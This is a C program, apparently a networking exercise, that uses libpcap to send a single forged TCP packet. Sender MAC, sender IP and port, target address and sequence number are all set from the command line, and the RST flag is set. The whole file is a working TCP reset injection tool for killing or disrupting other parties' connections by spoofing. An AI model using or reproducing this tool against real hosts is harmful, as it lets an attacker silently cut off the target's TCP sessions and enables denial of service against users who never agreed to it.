#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define __linux__
#ifndef __linux__
    #include <winsock2.h>
#else
    #include <netinet/in.h>
    #include <arpa/inet.h>
#endif

#include "../TCPLIB/tcplib.c"
#include "pcap.h"
#define STRSIZE 1024

enum{
    ARGV_CMD,
    ARGV_SOURCE_MAC,
    ARGV_DEST_MAC,
    ARGV_SOURCE_IP,
    ARGV_SOURCE_PORT,
    ARGV_TARGET_IP,
    ARGV_TARGET_PORT,
    ARGV_SEQ
};

int main(int argc, char **argv)
{
    //checking
    if(argc != 8){
        printf("Usage : %s [Source MAC][Destination Mac][Source IP][Source Port][Target IP][Target Port][Seq]\n",argv[0]);
        return 1;
    }
    //1.find all device
    pcap_if_t *alldevs, *d;
    char errbuf[PCAP_ERRBUF_SIZE];
    if((pcap_findalldevs(&alldevs,errbuf))<0){
        perror("pcap_findalldevs");
        return 1;
    }
    int i = 0;
    for(d = alldevs;d; d=d->next){
        printf("%d : %s\n",++i,(d->description)?(d->description):(d->name));
    }
    //2. select device
    printf("number :");
    int no;
    scanf("%d",&no);
    if(!(no <= i && no >0 )){
        perror("number error");
        return 1;
    }
    for(d = alldevs, i=0; d;d=d->next){
        if(no == ++i ) break;
    }
    //3. set packet
    //3-0 making tool
    pcap_t *adhandle;
    if(!(adhandle = pcap_open_live(d->name,65536,1,1000,errbuf))){
        perror("pcap_open_live");
        return 1;
    }
    struct tcp_packet tcp_packet;
    memset(&tcp_packet,0x00,sizeof(tcp_packet));
    //3-1. set ethernet protocol
    strmac_to_buffer(argv[ARGV_SOURCE_MAC],tcp_packet.ether_header.ether_shost);
    strmac_to_buffer(argv[ARGV_DEST_MAC],tcp_packet.ether_header.ether_dhost);
    tcp_packet.ether_header.ether_type = htons(ETHERTYPE_IP);
    //3-2. set TCP protocol
    unsigned int seq;
    sscanf(argv[ARGV_SEQ],"%u",&seq);// string to integer
    make_tcp_header(
            &tcp_packet,
            argv[ARGV_SOURCE_IP],atoi(argv[ARGV_SOURCE_PORT]),
            argv[ARGV_TARGET_IP],atoi(argv[ARGV_TARGET_PORT]),
            seq,0,TH_RST);
    //3-3. set IP protocol
    make_ip_header(
            &(tcp_packet.ip),
            argv[ARGV_SOURCE_IP],argv[ARGV_TARGET_IP],sizeof(struct tcphdr));
    //4. send
    pcap_sendpacket(adhandle,
                    (unsigned char *)&tcp_packet,sizeof(tcp_packet));
    //5. Deallocate
    pcap_freealldevs(alldevs);
    pcap_close(adhandle);
    return 0;
}
